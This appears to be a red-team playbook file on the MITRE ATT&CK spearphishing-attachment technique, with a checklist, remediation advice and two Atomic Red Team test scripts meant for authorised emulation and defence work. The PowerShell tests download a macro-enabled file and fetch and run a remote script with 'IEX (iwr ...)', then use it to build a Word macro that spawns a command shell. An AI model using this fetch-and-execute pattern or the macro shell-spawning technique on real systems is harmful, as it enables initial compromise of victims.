---
name: "T1566.001_spearphishing-attachment"
description: "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems."
category: "input-validation"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1566.001
  - initial-access
  - linux
  - macos
  - windows
  - sub-technique
technique_id: "T1566.001"
tactic: "initial-access"
all_tactics:
  - initial-access
platforms:
  - Linux
  - macOS
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1566/001"
tech_stack:
  - linux
  - macos
  - windows
cwe_ids:
  - CWE-20
chains_with:
  - T1566
  - T1566.002
  - T1566.003
  - T1566.004
prerequisites:
  - T1566
severity_boost:
  T1566: "Chain with T1566 for deeper attack path"
  T1566.002: "Chain with T1566.002 for deeper attack path"
  T1566.003: "Chain with T1566.003 for deeper attack path"
---

# T1566.001 Spearphishing Attachment

> **Sub-technique of:** T1566

## High-Level Description

Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.

There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.

## Kill Chain Phase

- Initial Access (TA0001)

**Platforms:** Linux, macOS, Windows

## What to Check

- [ ] Identify if Spearphishing Attachment technique is applicable to target environment
- [ ] Check Linux systems for indicators of Spearphishing Attachment
- [ ] Check macOS systems for indicators of Spearphishing Attachment
- [ ] Check Windows systems for indicators of Spearphishing Attachment
- [ ] Verify mitigations are bypassed or absent (7 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Download Macro-Enabled Phishing Attachment

This atomic test downloads a macro enabled document from the Atomic Red Team GitHub repository, simulating an end user clicking a phishing link to download the file.
The file "PhishingAttachment.xlsm" is downloaded to the %temp% directory.

**Supported Platforms:** windows

```powershell
$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm
```

### Atomic Test 2: Word spawned a command shell and used an IP address in the command line

Word spawning a command prompt then running a command with an IP address in the command line is an indicator of malicious activity.
Upon execution, CMD will be launched and ping 8.8.8.8.

**Supported Platforms:** windows

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
```

**Dependencies:**
- Microsoft #{ms_product} must be installed


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Spearphishing Attachment by examining the target platforms (Linux, macOS, Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1566.001 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1049 Antivirus/Antimalware
Anti-virus can also automatically quarantine suspicious files.

### M1018 User Account Management
Apply user account management principles to limit permissions for accounts interacting with email attachments, ensuring that only necessary accounts have the ability to open or execute files. Restricting account privileges reduces the potential impact of malicious attachments by preventing unauthorized execution or spread of malware within the environment.

### M1047 Audit
Enable auditing and monitoring for email attachments and file transfers to detect and investigate suspicious activity. Regularly review logs for anomalies related to attachments containing potentially malicious content, as well as any attempts to execute or interact with these files. This practice helps identify spearphishing attempts before they can lead to further compromise.

### M1031 Network Intrusion Prevention
Network intrusion prevention systems and systems designed to scan and remove malicious email attachments can be used to block activity.

### M1054 Software Configuration
Use anti-spoofing and email authentication mechanisms to filter messages based on validity checks of the sender domain (using SPF) and integrity of messages (using DKIM). Enabling these mechanisms within an organization (through policies such as DMARC) may enable recipients (intra-org and cross domain) to perform similar message filtering and validation.

### M1017 User Training
Users can be trained to identify social engineering techniques and spearphishing emails.

### M1021 Restrict Web-Based Content
Block unknown or unused attachments by default that should not be transmitted over email as a best practice to prevent some vectors, such as .scr, .exe, .pif, .cpl, etc. Some email scanning devices can open and analyze compressed and encrypted formats, such as zip and rar that may be used to conceal malicious attachments.


## Detection

### Detection Strategy for Spearphishing Attachment across OS Platforms


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Spearphishing Attachment technique applicable | High | Initial Access |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-20 | Improper Input Validation |


## References

- [ACSC Email Spoofing](https://web.archive.org/web/20210708014107/https://www.cyber.gov.au/sites/default/files/2019-03/spoof_email_sender_policy_framework.pdf)
- [Unit 42 DarkHydrus July 2018](https://researchcenter.paloaltonetworks.com/2018/07/unit42-new-threat-actor-group-darkhydrus-targets-middle-east-government/)
- [Microsoft Anti Spoofing](https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spoofing-protection?view=o365-worldwide)
- [Elastic - Koadiac Detection with EQL](https://www.elastic.co/security-labs/embracing-offensive-tooling-building-detections-against-koadic-using-eql)
- [Atomic Red Team - T1566.001](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1566.001)
- [MITRE ATT&CK - T1566.001](https://attack.mitre.org/techniques/T1566/001)
